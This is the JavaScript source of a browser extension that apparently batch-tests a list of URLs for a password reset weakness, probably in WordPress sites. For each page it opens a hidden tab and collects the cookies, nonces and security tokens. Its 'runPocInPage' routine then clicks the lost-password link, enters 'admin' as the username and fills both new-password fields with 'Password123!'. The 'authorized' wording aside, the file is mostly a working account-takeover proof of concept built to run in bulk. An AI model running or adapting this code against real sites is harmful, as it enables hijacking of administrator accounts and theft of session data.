const STORAGE_KEY = 'reset-url-list';
const RESULTS_KEY = 'reset-audit-results';

const urlInput = document.getElementById('urlInput');
const statusPill = document.getElementById('statusPill');
const targetCount = document.getElementById('targetCount');
const resultsBox = document.getElementById('resultsBox');

const loadBtn = document.getElementById('loadBtn');
const clearBtn = document.getElementById('clearBtn');
const runBtn = document.getElementById('runBtn');

function setStatus(text, tone = 'info') {
  statusPill.textContent = text;
  statusPill.style.borderColor = tone === 'success'
    ? 'rgba(102, 255, 208, 0.35)'
    : tone === 'warn'
      ? 'rgba(255, 175, 95, 0.38)'
      : tone === 'fail'
        ? 'rgba(255, 95, 124, 0.38)'
        : 'rgba(103, 243, 255, 0.4)';
  statusPill.style.color = tone === 'success'
    ? '#b8fce9'
    : tone === 'warn'
      ? '#ffd9a8'
      : tone === 'fail'
        ? '#ffd0d8'
        : '#9be7ff';
}

function appendLog(message, tone = 'info') {
  const line = document.createElement('div');
  line.className = `log-line ${tone}`;
  line.textContent = message;
  resultsBox.prepend(line);
}

function updateTargetCount() {
  const urls = parseInput(urlInput.value);
  targetCount.textContent = String(urls.length);
}

function parseInput(value) {
  return value
    .split(/\n+/)
    .map((item) => item.trim())
    .filter(Boolean)
    .map((item) => item.replace(/\s+$/, '') );
}

function saveUrls() {
  const urls = parseInput(urlInput.value);
  chrome.storage.local.set({ [STORAGE_KEY]: urls });
  updateTargetCount();
}

function loadUrls() {
  chrome.storage.local.get([STORAGE_KEY], ({ [STORAGE_KEY]: urls = [] }) => {
    urlInput.value = (urls || []).join('\n');
    updateTargetCount();
    appendLog(`Loaded ${urls.length} target URLs.`, 'info');
  });
}

function clearUrls() {
  urlInput.value = '';
  chrome.storage.local.set({ [STORAGE_KEY]: [] }, () => {
    updateTargetCount();
    appendLog('Target list cleared.', 'warn');
  });
}

async function openTabAndCapture(url) {
  const tab = await chrome.tabs.create({ url, active: false });
  await waitForTabLoad(tab.id);

  const exec = await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: () => {
      const doc = document;
      const payload = {
        href: location.href,
        title: document.title,
        cookies: document.cookie || '',
        userAgent: navigator.userAgent,
        language: navigator.language,
        htmlLength: document.body ? document.body.innerHTML.length : 0,
        forms: [...document.querySelectorAll('form')].map((form) => form.action || form.method || '').slice(0, 10),
        nonceCandidates: [...document.querySelectorAll('input')]
          .map((input) => ({
            name: input.name || '',
            id: input.id || '',
            value: input.value || '',
            type: input.type || ''
          }))
          .filter((item) => /nonce|security|wpnonce|token/i.test(item.name || item.id || ''))
          .slice(0, 10)
      };
      return payload;
    }
  });

  return { tabId: tab.id, result: exec[0]?.result ?? {} };
}

function waitForTabLoad(tabId) {
  return new Promise((resolve) => {
    const done = () => {
      chrome.tabs.onUpdated.removeListener(onUpdate);
      resolve();
    };

    const onUpdate = (updatedTabId, info) => {
      if (updatedTabId === tabId && info.status === 'complete') {
        done();
      }
    };

    chrome.tabs.onUpdated.addListener(onUpdate);
    chrome.tabs.get(tabId, (tab) => {
      if (tab.status === 'complete') {
        done();
      }
    });
  });
}

async function runPocInPage(tabId) {
  const payload = await chrome.scripting.executeScript({
    target: { tabId },
    func: () => {
      const doc = document;
      const selectors = [
        'input[name="user_login"]',
        'input[name="login"]',
        'input[name="log"]',
        'input[id="user_login"]',
        'input[id="login"]',
        'input[id="log"]'
      ];

      const results = {
        steps: [],
        status: 'not-run',
        nonce: '',
        languageHints: [],
        foundTriggeredReset: false,
        foundPasswordForm: false,
        username: ''
      };

      function findFirst(selector) {
        return doc.querySelector(selector);
      }

      const nonceInput =
        findFirst('input[name="_wpnonce"]') ||
        findFirst('input[name="nonce"]') ||
        findFirst('input[id="_wpnonce"]') ||
        findFirst('input[id="nonce"]');

      if (nonceInput) {
        results.nonce = nonceInput.value || '';
        results.steps.push('Nonce detected.');
      }

      const langNodes = [
        ...doc.querySelectorAll('[lang]'),
        ...doc.querySelectorAll('[data-trp-language]'),
        ...doc.querySelectorAll('[hreflang]')
      ];

      results.languageHints = [...new Set(langNodes
        .map((node) => node.getAttribute('lang') || node.getAttribute('hreflang') || node.getAttribute('data-trp-language'))
        .filter(Boolean) )].slice(0, 10);

      if (results.languageHints.length) {
        results.steps.push('Language metadata detected.');
      }

      const lostPasswordLink =
        findFirst('a[href*="lostpassword"]') ||
        findFirst('a[href*="action=lostpassword"]') ||
        findFirst('a[href*="reset"]');

      if (lostPasswordLink) {
        lostPasswordLink.click();
        results.foundTriggeredReset = true;
        results.steps.push('Password reset trigger attempted.');
      }

      const userField = selectors
        .map((selector) => findFirst(selector))
        .find(Boolean);

      if (userField) {
        userField.value = 'admin';
        results.username = userField.value || 'admin';
        results.steps.push('Username field populated for validation.');
      }

      const pass1 = findFirst('input[name="pass1"]') || findFirst('input[id="pass1"]');
      const pass2 = findFirst('input[name="pass2"]') || findFirst('input[id="pass2"]');

      if (pass1 && pass2) {
        pass1.value = 'Password123!';
        pass2.value = 'Password123!';
        results.foundPasswordForm = true;
        results.steps.push('Password change form populated.');
      }

      if (results.foundPasswordForm || results.foundTriggeredReset) {
        results.status = 'candidate-match';
      }

      return results;
    }
  });

  return payload[0]?.result ?? { steps: ['No page execution result'], status: 'empty' };
}

async function runAudit() {
  const urls = parseInput(urlInput.value);
  if (!urls.length) {
    setStatus('EMPTY', 'warn');
    appendLog('Add at least one authorized URL.', 'warn');
    return;
  }

  setStatus('RUNNING', 'info');
  chrome.storage.local.set({ [STORAGE_KEY]: urls });
  const allResults = [];

  for (const url of urls) {
    try {
      appendLog(`Opening target: ${url}`, 'info');
      const { tabId, result: meta } = await openTabAndCapture(url);

      const audit = await runPocInPage(tabId);
      const snapshot = {
        url,
        title: meta.title || '',
        userAgent: meta.userAgent || '',
        cookies: meta.cookies || '',
        language: meta.language || '',
        status: audit.status,
        nonce: audit.nonce || '',
        languageHints: audit.languageHints || [],
        steps: audit.steps || [],
        username: audit.username || '',
        foundPasswordForm: !!audit.foundPasswordForm,
        foundTriggeredReset: !!audit.foundTriggeredReset
      };

      allResults.push(snapshot);
      chrome.storage.local.set({ [RESULTS_KEY]: allResults });

      const summary = `${url} -> ${audit.status || 'unknown'}`;
      appendLog(summary, audit.status === 'candidate-match' ? 'success' : 'warn');

      if (audit.steps && audit.steps.length) {
        audit.steps.forEach((step) => appendLog(`  - ${step}`, 'info'));
      }

      await new Promise((resolve) => setTimeout(resolve, 600));
      await chrome.tabs.remove(tabId);
    } catch (error) {
      appendLog(`Target failed: ${url} (${String(error)})`, 'fail');
    }
  }

  setStatus('DONE', 'success');
  appendLog(`Audit finished for ${urls.length} authorized targets.`, 'success');
}

loadBtn.addEventListener('click', () => {
  loadUrls();
});

clearBtn.addEventListener('click', () => {
  clearUrls();
});

runBtn.addEventListener('click', () => {
  runAudit();
});

urlInput.addEventListener('input', () => {
  updateTargetCount();
});

loadUrls();
